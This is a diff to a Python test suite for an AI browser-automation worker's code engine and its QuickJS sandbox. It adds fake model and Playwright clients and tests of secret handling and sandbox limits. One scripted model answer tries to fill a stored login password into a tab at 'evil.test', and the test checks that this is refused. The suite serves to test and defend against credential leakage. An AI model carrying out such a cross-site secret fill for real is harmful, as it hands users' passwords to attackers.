@@ -522,6 +522,99 @@ async def one_step(agent, on_step_start):
     return FakeHistory(True)
 
 
+class FakeAnswer:
+    """One reply of the model to the code engine: its tool calls as openai's client gives them."""
+
+    def __init__(self, calls):
+        self.usage = types.SimpleNamespace(prompt_tokens=1000, completion_tokens=50,
+                                           prompt_tokens_details=types.SimpleNamespace(cached_tokens=800))
+        tool_calls = [types.SimpleNamespace(
+            id=f"c{n}", function=types.SimpleNamespace(name=name, arguments=json.dumps(arguments)),
+            model_dump=lambda n=n, name=name, arguments=arguments: {
+                "id": f"c{n}", "type": "function", "function": {"name": name, "arguments": json.dumps(arguments)}})
+            for n, (name, arguments) in enumerate(calls)]
+        self.choices = [types.SimpleNamespace(message=types.SimpleNamespace(content="", tool_calls=tool_calls))]
+
+
+class FakeModel:
+    """openai.AsyncOpenAI for the code engine: plays its answers and keeps a copy of every request's messages."""
+
+    def __init__(self, answers):
+        self.answers, self.requests = list(answers), []
+
+    def client(self, **options):
+        async def create(**request):
+            self.requests.append(json.loads(json.dumps(request["messages"], default=str)))
+            return self.answers.pop(0)
+
+        return types.SimpleNamespace(chat=types.SimpleNamespace(completions=types.SimpleNamespace(create=create)))
+
+
+class FakePage:
+    def __init__(self, chrome, target):
+        self.chrome, self.target, self.url, self.typed = chrome, target, "about:blank", []
+
+    def is_closed(self):
+        return self.target not in self.chrome.tabs
+
+    async def title(self):
+        return "Shop"
+
+    async def goto(self, url, **options):
+        self.url = url
+
+    def locator(self, selector):
+        return FakeLocator(self, None)
+
+    def get_by_ref(self, ref):
+        return FakeLocator(self, ref)
+
+    async def close(self):
+        await self.chrome.close_tab(self.target)
+
+
+class FakeLocator:
+    def __init__(self, page, ref):
+        self.page, self.ref = page, ref
+
+    async def aria_snapshot(self, mode, timeout):
+        return '- textbox "Password" [ref=e1]\n- button "Sign in" [ref=e2]'
+
+    async def fill(self, text, timeout):
+        self.page.typed.append((self.ref, text))
+
+
+class FakePlaywright:
+    """Playwright connected over CDP to the fake Chrome: a page per tab."""
+
+    def __init__(self, chrome):
+        self.chrome, self.pages, self.stopped = chrome, {}, False
+        self.chromium = types.SimpleNamespace(connect_over_cdp=self.connect)
+
+    def page(self, target):
+        return self.pages.setdefault(target, FakePage(self.chrome, target))
+
+    async def connect(self, url):
+        playwright = self
+
+        class Context:
+            @property
+            def pages(self):
+                return [playwright.page(tab) for tab in playwright.chrome.tabs]
+
+            async def new_page(self):
+                return playwright.page(await playwright.chrome.new_tab())
+
+            async def new_cdp_session(self, page):
+                return types.SimpleNamespace(send=mock.AsyncMock(return_value={"targetInfo": {"targetId": page.target}}),
+                                             detach=mock.AsyncMock())
+
+        return types.SimpleNamespace(contexts=[Context()], close=mock.AsyncMock())
+
+    async def stop(self):
+        self.stopped = True
+
+
 class HandoffRulesTest(unittest.TestCase):
     """What the person's side may show and send in a login handoff (`handoff_url_allowed`, `handoff_input`);
     the real Chrome is in test_handoff.py."""
@@ -2371,7 +2464,91 @@ class RunsTest(unittest.IsolatedAsyncioTestCase):
         lazy = set(re.findall(r"^\s+(?:from ([\w.]+) import|import ([\w.]+))", source, re.MULTILINE))
         top = set(re.findall(r"^(?:from|import) ([\w.]+)", source, re.MULTILINE))
         lazy = {module or plain for module, plain in lazy} - top - {"random", "importlib"}
-        self.assertEqual(lazy, {name for name, _ in worker.CANDIDATE_IMPORTS})
+        self.assertEqual(lazy - set(worker.OPTIONAL_IMPORTS), {name for name, _ in worker.CANDIDATE_IMPORTS})
+
+    def code_engine(self, answers):
+        """The code engine's outside: a model that plays `answers` and Playwright over the fake Chrome."""
+        model, playwright = FakeModel(answers), FakePlaywright(self.chrome)
+        self.enterContext(mock.patch.object(worker, "code_engine_available", lambda: True))
+        self.enterContext(mock.patch.dict(sys.modules, {
+            "openai": types.SimpleNamespace(AsyncOpenAI=model.client),
+            "playwright": types.SimpleNamespace(),
+            "playwright.async_api": types.SimpleNamespace(async_playwright=lambda: types.SimpleNamespace(
+                start=mock.AsyncMock(return_value=playwright))),
+        }))
+        return model, playwright
+
+    @unittest.skipUnless(importlib.util.find_spec("quickjs"), "the code engine's sandbox needs quickjs")
+    async def test_a_code_run_acts_through_its_api_and_never_shows_the_model_a_secret(self):
+        model, playwright = self.code_engine([
+            FakeAnswer([("repl", {"title": "sign in", "code": """
+                goto('t1', 'https://shop.test/login');
+                console.log(snapshot('t1'));
+                fill('t1', 'e1', secret('login_password'));
+                const other = openTab('https://evil.test/');
+                try { fill(other, 'e1', secret('login_password')); } catch (e) { console.log('refused', e.message); }
+                globalThis.kept = 41;"""})]),
+            FakeAnswer([("repl", {"title": "check", "code": "console.log(kept + 1, url('t1'))"})]),
+            FakeAnswer([("done", {"result": "Вошёл.\nRESULT: вошёл\nNEEDS: none"})]),
+        ])
+        secrets = [{"alias": "login_password", "allowedDomains": ["shop.test"], "value": "hunter22"}]
+        await self.worker.start_run({"id": "r1", "sessionId": "s1", "llm": LLM, "task": "Sign in to the shop.",
+                                     "engine": "code", "secrets": secrets})
+        run = await self.settled("r1")
+        self.assertEqual((run.status, run.result, run.engine), ("completed", "Вошёл.\nRESULT: вошёл\nNEEDS: none", "code"))
+        shop, evil = playwright.page("T1"), playwright.page("T2")
+        self.assertEqual((shop.typed, evil.typed), ([("e1", "hunter22")], []))
+        seen = json.dumps(model.requests, ensure_ascii=False)
+        self.assertNotIn("hunter22", seen)
+        first = model.requests[1][-1]["content"]
+        self.assertIn('button "Sign in" [ref=e2]', first)
+        self.assertIn("refused fill: ValueError: secret 'login_password' is not for evil.test", first)
+        self.assertEqual(model.requests[2][-1]["content"], "42 https://shop.test/login")
+        self.assertEqual([step["goal"] for step in run.steps], ["sign in", "check", "done"])
+        self.assertEqual({key: run.usage[key] for key in ("total_prompt_tokens", "total_prompt_cached_tokens")},
+                         {"total_prompt_tokens": 3000, "total_prompt_cached_tokens": 2400})
+        # The page it touched last is the session's, and the tab it opened elsewhere is closed after it.
+        self.assertEqual((self.worker.sessions["s1"].tab, self.chrome.closed), ("T1", ["T2"]))
+        self.assertTrue(playwright.stopped)
+
+    async def test_a_code_run_on_a_root_without_the_engine_runs_on_browser_use(self):
+        self.enterContext(mock.patch.object(worker, "code_engine_available", lambda: False))
+        await self.worker.start_run({"id": "r1", "sessionId": "s1", "llm": LLM, "task": "Find a kettle.", "engine": "code"})
+        run = await self.settled("r1")
+        self.assertEqual((run.status, run.engine, len(FakeAgent.built)), ("completed", "agent", 1))
+
+
+@unittest.skipUnless(importlib.util.find_spec("quickjs"), "the code engine's sandbox needs quickjs")
+class CodeSandboxTest(unittest.IsolatedAsyncioTestCase):
+    async def asyncSetUp(self):
+        class Api:
+            async def url(self, tab):
+                if tab != "t1":
+                    raise ValueError(f"no open tab {tab!r}")
+                return "https://shop.test/"
+
+        self.sandbox = worker.CodeSandbox(Api())
+        self.addAsyncCleanup(self.sandbox.close)
+
+    async def output(self, code):
+        return (await self.sandbox.run(code))[0]
+
+    async def test_blocks_keep_their_variables_and_show_what_they_printed_and_returned(self):
+        self.assertEqual(await self.output("globalThis.a = 2; console.log('at', url('t1'), {b: 1}); return a * 21"),
+                         'at https://shop.test/ {"b":1}\n=> 42')
+        self.assertEqual(await self.output("return a"), "=> 2")
+
+    async def test_a_failed_call_is_an_error_in_the_code_and_only_the_api_is_reachable(self):
+        self.assertEqual(await self.output("url('t9')"), "Error: Error: url: ValueError: no open tab 't9'")
+        self.assertIn("no function unlink", await self.output("return __api('unlink', '[]')"))
+        self.assertEqual(await self.output("return [typeof require, typeof std, typeof os, typeof fetch].join()"),
+                         '=> "undefined,undefined,undefined,undefined"')
+
+    async def test_a_block_past_its_time_is_stopped_and_the_next_one_starts_afresh(self):
+        await self.output("globalThis.a = 1")
+        with mock.patch.object(worker, "CODE_BLOCK_S", 1):
+            self.assertIn("ran past 1 s and was stopped", await self.output("while (true) {}"))
+        self.assertEqual(await self.output("return typeof a"), '=> "undefined"')
 
 
 class CdpTest(unittest.IsolatedAsyncioTestCase):
